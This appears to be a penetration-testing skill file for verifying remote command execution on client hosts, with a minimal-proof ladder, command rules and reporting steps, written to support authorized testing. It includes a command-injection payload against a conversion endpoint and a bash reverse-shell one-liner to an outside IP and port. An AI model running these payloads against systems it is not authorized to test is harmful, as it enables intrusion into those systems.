---
name: rce-verification
description: Verify command execution or a shell end-to-end (proof, not exploitation spree) under the deeptool gate — minimal commands, session closed immediately, no persistence, no mass collection.
---

# RCE / shell verification

Client policy: **command execution and shells are allowed** in deep mode. What is not allowed is
using a shell as a base for further damage — no persistence, no mass collection, no destructive
actions. The goal is one reproducible proof, then close.

## The minimum proof ladder

Stop at the first rung that answers the question.

| Rung | Evidence | Notes |
| --- | --- | --- |
| 1 | output of `id` (or `whoami; hostname`) | strongest single proof of code execution |
| 2 | `cat /etc/hostname` or a file only the service user can read | proves identity + file access |
| 3 | one write to a file you created in `/tmp` on the target | proves write, still non-destructive |
| 4 | database read through the app's own credential | only if the finding is about data access |

Do **not** escalate past rung 2 unless the finding needs it. A shell that prints `uid=33(www-data)`
is enough to turn "possible RCE" into "confirmed RCE".

## Command discipline inside a session

```bash
# one shot, no interactive session
deeptool run --key rce-endpoint-1 -- curl -s -o /tmp/poc.out -w '%{http_code}' \
  'https://target/api/convert?path=|id'

# reverse shell (allowed), bound and short-lived
deeptool run --key rce-shell-1 -- bash -c 'timeout 20 bash -i >& /dev/tcp/10.99.0.10/4444 0>&1'
```

Rules:

1. **Every command goes through `deeptool run`** with a hypothesis key — that is what produces the
   audit trail and enforces the budget (two attempts per key).
2. **Prefix risky shells with `timeout`.** A shell that outlives the test is a liability.
3. **No `cd`-and-explore wandering.** Allowed commands: identity, hostname, one directory listing,
   one file read that proves the impact. Nothing else.
4. **Never** touch: `/etc` writes, user databases on the host, other sites on the box, backups,
   logs of other tenants, or anything that belongs to a citizen.
5. **Close immediately**: `exit`, `sessions -K` (msf), or let `timeout` kill it.
6. **Screenshot-free evidence**: save the exact command and its output into the finding; a picture of
   a terminal is not evidence.

## What counts as "already an incident"

On a production government host, a working shell is an incident for them from the first second. So:

- announce it in the finding with the timestamp of first execution;
- do not fix their system (no patching, no cleanup beyond your own `/tmp` file);
- report the session transcript and the window during which it was open;
- if the client has monitoring, they will see it — say so, so they don't chase a ghost.

## When the shell is the *only* way to prove it

If output-based proof (rung 1–2) is impossible and the client insists, choose the least invasive
channel: a one-line `id` over an interruptible reverse shell beats uploading a full interactive
implant. Never deploy a web shell file to production — it is persistence, and persistence is off the
table outside a lab.

## After the run

1. `deeptool stop` — closes the gate for the rest of the session.
2. `deeptool log --tail 20` — attach the audit lines (command, exit code, duration) to the finding.
3. Remove your own artefacts on the target if they are yours (`/tmp/poc*.out`), and list them in the
   report along with the test accounts created earlier.

## Related skills

`exploit-depth` (which level allows what), `metasploit` (module-driven exploitation),
`cve-chain` (reaching the vulnerable code in the first place).
